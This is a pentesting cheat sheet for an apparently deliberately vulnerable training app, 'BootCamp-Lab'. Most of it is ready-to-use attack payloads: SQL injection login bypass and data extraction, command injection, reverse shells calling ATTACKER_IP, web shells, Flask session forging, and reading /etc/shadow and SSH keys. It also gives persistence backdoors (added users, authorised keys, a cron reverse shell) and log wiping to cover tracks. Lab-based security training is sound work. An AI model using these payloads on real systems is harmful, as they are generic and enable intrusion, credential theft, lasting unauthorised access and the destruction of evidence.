# BootCamp-Lab - Exploitation Cheat Sheet

## Quick Reference for Pentesting BootCamp-Lab

---

## Reconnaissance

### Information Disclosure Endpoints
```
/debug          - SECRET_KEY, config, environment variables
/about          - System info, OS details
/phpinfo        - Server configuration
Error messages  - Stack traces, SQL queries
```

### Default Credentials
```
Admin: admin / admin123
Users: john / password123
       alice / alice2023
       bob / qwerty
```

---

##  SQL Injection

### Authentication Bypass (Login Page)
```sql
Username: admin' OR '1'='1' --
Password: anything

Username: admin' --
Password: anything

Username: ' OR '1'='1' --
Password: ' OR '1'='1' --
```

### Data Extraction (Search Page)
```sql
# Get database structure
' UNION SELECT 1,name,sql,4,5 FROM sqlite_master WHERE type='table'--

# Extract all users with passwords
' UNION SELECT id,username,password,email,role FROM users--

# Extract admin only
' UNION SELECT id,username,password,email,role FROM users WHERE role='admin'--

# Count users
' UNION SELECT COUNT(*),NULL,NULL,NULL,NULL FROM users--

# Extract specific user
' UNION SELECT id,username,password,email,role FROM users WHERE username='admin'--
```

---

## Command Injection

### Ping Utility (/ping)
```bash
# Basic command execution
127.0.0.1; whoami
127.0.0.1 && id
127.0.0.1 | pwd

# Read sensitive files
127.0.0.1; cat /etc/passwd
127.0.0.1 && cat /etc/shadow

# System enumeration
127.0.0.1; uname -a
127.0.0.1; ls -la /home
127.0.0.1; env

# Find SUID binaries
127.0.0.1; find / -perm -4000 2>/dev/null

# Network enumeration
127.0.0.1; ifconfig
127.0.0.1; netstat -tulpn
```

### DNS Lookup (/dns-lookup)
```bash
# Same payloads work here
google.com && whoami
google.com; cat /etc/passwd
google.com | ls -la
```

---

## Reverse Shells

### Bash Reverse Shell
```bash
# Listener on attacker machine
nc -lvnp 4444

# Payload in ping/dns
127.0.0.1; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

### Python Reverse Shell
```bash
# Payload
127.0.0.1; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

### Netcat Reverse Shell
```bash
# If netcat is available
127.0.0.1; nc -e /bin/bash ATTACKER_IP 4444

# Alternative
127.0.0.1; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
```

---

## File Upload Exploitation

### Method 1: Python Web Shell
```python
# Create shell.py
import os
from flask import request
cmd = request.args.get('cmd', 'id')
print(os.popen(cmd).read())
```

Upload and access:
```
http://target:5000/uploads/shell.py?cmd=whoami
```

Execute via command injection:
```bash
127.0.0.1; python3 uploads/shell.py
```

### Method 2: Bash Reverse Shell Script
```bash
# Create revshell.sh
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

Upload and execute:
```bash
127.0.0.1; chmod +x uploads/revshell.sh
127.0.0.1; ./uploads/revshell.sh
```

### Method 3: PHP Web Shell (if PHP is installed)
```php
# Create shell.php
<?php system($_GET['cmd']); ?>
```

---

## Session Manipulation

### Get SECRET_KEY
```bash
curl http://target:5000/debug | grep SECRET_KEY
```

### Decode Session Cookie
```bash
# Install flask-unsign
pip install flask-unsign

# Decode current session
flask-unsign --decode --cookie "YOUR_SESSION_COOKIE"
```

### Forge Admin Session
```bash
# Create admin session
flask-unsign --sign --cookie "{'user_id': 1, 'username': 'admin', 'role': 'admin'}" --secret "weak_secret_key_12345"

# Replace cookie in browser and access /admin
```

---

## Full Exploitation Chain

### Step 1: Reconnaissance
```bash
# Get system info
curl http://target:5000/about

# Get SECRET_KEY and configs
curl http://target:5000/debug

# Enumerate users via SQL injection
http://target:5000/search?q=' UNION SELECT id,username,password,email,role FROM users--
```

### Step 2: Authentication Bypass
```
Navigate to /login
Username: admin' OR '1'='1' --
Password: anything
```

### Step 3: Upload Web Shell
```
Navigate to /upload
Upload: shell.py (Python web shell)
```

### Step 4: Gain Shell Access
```bash
# Setup listener
nc -lvnp 4444

# Execute reverse shell via command injection
Ping: 127.0.0.1; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

### Step 5: Post-Exploitation
```bash
# On target machine
whoami
id
uname -a
ls -la /home
cat /etc/passwd

# Find interesting files
find / -name "*.db" 2>/dev/null
find / -name "*.txt" 2>/dev/null
find / -perm -4000 2>/dev/null

# Check database
sqlite3 /opt/BootCamp-Lab/instance/vulnerable_app.db
.tables
SELECT * FROM users;
```

---

## Tools

### Useful Tools for Exploitation
```bash
# SQL Injection
sqlmap -u "http://target:5000/search?q=test" --batch --dump

# Web scanning
nikto -h http://target:5000
dirb http://target:5000

# Enumeration
nmap -sV -sC target

# Session manipulation
flask-unsign --decode --cookie "SESSION"
flask-unsign --sign --cookie "{'role':'admin'}" --secret "KEY"
```

---

## Post-Exploitation

### Enumeration Commands
```bash
# System info
uname -a
cat /etc/os-release
lsb_release -a

# Users
cat /etc/passwd
cat /etc/shadow
last
w

# Network
ifconfig
netstat -tulpn
ss -tulpn

# Processes
ps aux
ps -ef

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# SUID binaries
find / -perm -4000 2>/dev/null

# Writable directories
find / -writable -type d 2>/dev/null

# SSH keys
ls -la ~/.ssh
cat ~/.ssh/id_rsa
```

### Persistence Techniques
```bash
# Add SSH key
echo "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys

# Create backdoor user
useradd -m -s /bin/bash backdoor
echo "backdoor:password" | chpasswd

# Cron job backdoor
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" | crontab -
```

---

## Covering Tracks

### Clear Logs
```bash
# Clear bash history
history -c
cat /dev/null > ~/.bash_history

# Clear system logs
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/syslog

# Remove uploaded files
rm /opt/BootCamp-Lab/uploads/*
```

---

## Database Queries

### Direct Database Access
```bash
# Connect to database
sqlite3 /opt/BootCamp-Lab/instance/vulnerable_app.db

# List tables
.tables

# View users
SELECT * FROM users;

# View activity logs
SELECT * FROM activity_logs ORDER BY timestamp DESC LIMIT 20;

# View products
SELECT * FROM products;
```

---

## Learning Path

1. **Start with Recon** - Visit /debug, /about, check error messages
2. **Try SQL Injection** - Bypass login, extract data
3. **Test Command Injection** - Execute commands via ping/DNS
4. **Upload Web Shell** - Use file upload for persistence
5. **Gain Reverse Shell** - Get interactive shell access
6. **Post-Exploitation** - Enumerate, escalate, persist
7. **Write Report** - Document findings professionally

---

## Remember

- This is for **educational purposes only**
- Always get **written permission** before testing
- Document **everything** for your report
- Practice **ethical hacking** principles
- Clean up after yourself

---

**Happy Hacking! 🏴**
